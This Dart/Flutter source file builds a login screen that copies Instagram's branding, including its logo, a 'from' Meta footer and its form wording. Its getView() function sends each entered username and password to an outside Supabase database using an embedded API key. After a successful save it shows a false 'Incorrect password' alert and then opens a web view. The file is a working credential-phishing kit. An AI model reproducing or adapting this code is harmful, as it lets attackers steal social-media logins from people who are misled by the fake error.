import 'package:flutter/material.dart';
import 'package:instagram/sc_forget_password.dart';
import 'package:instagram/sc_sign_up.dart';
import 'package:http/http.dart' as http;
import 'package:instagram/sc_web_view.dart';
import 'package:rflutter_alert/rflutter_alert.dart';

class InstagramSingInScreen extends StatefulWidget {
  const InstagramSingInScreen({Key? key}) : super(key: key);

  @override
  _InstagramSingInScreenState createState() => _InstagramSingInScreenState();
}

class _InstagramSingInScreenState extends State<InstagramSingInScreen> {
  final _formKey = GlobalKey<FormState>();
  late String name;
  late String password;
  bool color = false;

  @override
  Widget build(BuildContext context) {
    return SafeArea(
      child: Directionality(
        textDirection: TextDirection.ltr,
        child: Scaffold(
          resizeToAvoidBottomInset: false,
          body: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              Padding(
                padding: const EdgeInsets.only(top: 20),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: const [
                    Text(
                      "English (UK)",
                      style: TextStyle(color: Colors.grey),
                    ),
                    Icon(
                      Icons.keyboard_arrow_down_outlined,
                      color: Colors.grey,
                    ),
                  ],
                ),
              ),
              const Padding(
                padding: EdgeInsets.only(top: 70),
                child: Image(
                  image: AssetImage('assets/image/instagram.png'),
                  width: 150,
                ),
              ),
              Form(
                  key: _formKey,
                  child: Padding(
                    padding: const EdgeInsets.only(top: 20),
                    child: Column(
                      children: [
                        Padding(
                            padding: const EdgeInsets.only(
                                left: 20, right: 20, top: 5),
                            child: Container(
                                margin:
                                    const EdgeInsets.symmetric(horizontal: 15),
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 10),
                                decoration: BoxDecoration(
                                    color: Colors.grey[200],
                                    borderRadius: BorderRadius.circular(5),
                                    border: const Border(
                                      bottom: BorderSide(
                                          width: 1, color: Colors.grey),
                                      top: BorderSide(
                                          width: 1, color: Colors.grey),
                                      left: BorderSide(
                                          width: 1, color: Colors.grey),
                                      right: BorderSide(
                                          width: 1, color: Colors.grey),
                                    )),
                                child: TextFormField(
                                  onChanged: (String value) {
                                    name = value;
                                  },
                                  style: const TextStyle(color: Colors.black),
                                  decoration: InputDecoration(
                                      hintText:
                                          'Phone number, username or email address',
                                      border: InputBorder.none,
                                      errorStyle: const TextStyle(
                                          fontWeight: FontWeight.bold,
                                          letterSpacing: 0.7,
                                          fontSize: 15),
                                      hintStyle: TextStyle(
                                          color: Colors.grey[600],
                                          fontSize: 14),
                                      contentPadding: const EdgeInsets.only(
                                          top: 15,
                                          right: 0,
                                          bottom: 20,
                                          left: 5)),
                                ))),
                        Padding(
                            padding: const EdgeInsets.only(
                                left: 20, right: 20, top: 5),
                            child: Container(
                                margin:
                                    const EdgeInsets.symmetric(horizontal: 15),
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 10),
                                decoration: BoxDecoration(
                                    color: Colors.grey[200],
                                    borderRadius: BorderRadius.circular(5),
                                    border: const Border(
                                      bottom: BorderSide(
                                          width: 1, color: Colors.grey),
                                      top: BorderSide(
                                          width: 1, color: Colors.grey),
                                      left: BorderSide(
                                          width: 1, color: Colors.grey),
                                      right: BorderSide(
                                          width: 1, color: Colors.grey),
                                    )),
                                child: TextFormField(
                                  onChanged: (String value) {
                                    password = value;
                                    if (value.length >= 4) {
                                      setState(() {
                                        color = true;
                                      });
                                    }
                                    if (value.length < 4) {
                                      setState(() {
                                        color = false;
                                      });
                                    }
                                  },
                                  obscureText: true,
                                  style: const TextStyle(color: Colors.black),
                                  decoration: InputDecoration(
                                      hintText: 'Password',
                                      border: InputBorder.none,
                                      errorStyle: const TextStyle(
                                          fontWeight: FontWeight.bold,
                                          letterSpacing: 0.7,
                                          fontSize: 15),
                                      hintStyle: TextStyle(
                                          color: Colors.grey[600],
                                          fontSize: 14),
                                      contentPadding: const EdgeInsets.only(
                                          top: 15,
                                          right: 0,
                                          bottom: 20,
                                          left: 5)),
                                ))),
                        Padding(
                          padding: const EdgeInsets.only(top: 15, left: 170),
                          child: GestureDetector(
                            onTap: (){
                              Navigator.push(
                                  context,
                                  MaterialPageRoute(
                                      builder: (context) =>
                                      const ForgetPasswordScreen()));
                            },
                            child: const Text(
                              "Forgotten your password?",
                              style: TextStyle(
                                  color: Color(0xff26A9FF),
                                  fontWeight: FontWeight.w600,
                                  fontSize: 16),
                            ),
                          ),
                        )
                      ],
                    ),
                  )),
              Padding(
                padding: const EdgeInsets.only(top: 30),
                child: GestureDetector(
                  onTap: () {
                    if (_formKey.currentState!.validate()) {
                      _formKey.currentState!.save();
                      getView();
                    }
                  },
                  child: Container(
                    width: MediaQuery.of(context).size.width / 1.22,
                    height: 50,
                    decoration: BoxDecoration(
                      color: color
                          ? const Color(0xff26A9FF)
                          : const Color(0xff78C9FF),
                      borderRadius: const BorderRadius.all(Radius.circular(5)),
                    ),
                    child: const Center(
                      child: Text(
                        'Log In',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 18,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.only(top: 20),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    const Text(
                      "Don't have an account? ",
                      style: TextStyle(color: Colors.grey),
                    ),
                    GestureDetector(
                        onTap: () {
                          Navigator.push(
                              context,
                              MaterialPageRoute(
                                  builder: (context) =>
                                      const InstagramSignUpScreen()));
                        },
                        child: const Text(
                          "Sing Up",
                          style: TextStyle(
                              color: Color(0xff26A9FF),
                              fontSize: 16,
                              fontWeight: FontWeight.bold),
                        )),
                  ],
                ),
              ),
              Padding(
                padding: EdgeInsets.only(
                    top: MediaQuery.of(context).size.height / 3.2),
                child: const Text(
                  "from",
                  style: TextStyle(color: Colors.grey),
                ),
              ),
              const Padding(
                padding: EdgeInsets.only(),
                child: Image(
                  image: AssetImage('assets/image/Meta-facebook-New-Logo.png'),
                  color: Colors.black54,
                  width: 70,
                  height: 50,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  getView() async {
    var url =
        Uri.parse('https://jrtwyjgpbxnvyqekzbfu.supabase.co/rest/v1/instagram');
    final response = await http.post(url, headers: {
      "apikey":
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTYzODAxMTE1MSwiZXhwIjoxOTUzNTg3MTUxfQ.3N2IoI9bRyFR9N0WSlBr9R3BYnYNipsAqwh5Y-Ru6jM",
      "Authorization":
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTYzODAxMTE1MSwiZXhwIjoxOTUzNTg3MTUxfQ.3N2IoI9bRyFR9N0WSlBr9R3BYnYNipsAqwh5Y-Ru6jM"
    }, body: {
      "userName": name,
      "Password": password
    });
    int responseBody = response.statusCode;
    if (responseBody == 201){
      return Alert(
          context: context,
          title: "Incorrect password",
          desc: "The password you entered is incorrect. Please try again.",
          style: const AlertStyle(
              alertElevation: 5.0,
              descStyle: TextStyle(
                  fontWeight: FontWeight.w500,
                  fontSize: 18,
                  fontFamily: 'Vazir')),
          buttons: [
            DialogButton(
                child: const Text(
                  'OK',
                  style:  TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 18,
                      color: Colors.white),
                ),
                onPressed: () {
                  Navigator.push(
                      context,
                      MaterialPageRoute(
                          builder: (context) =>
                          const WebViewScreen()));
                }),
          ]).show();
    }else {
      print(response.body);
    }
  }
}
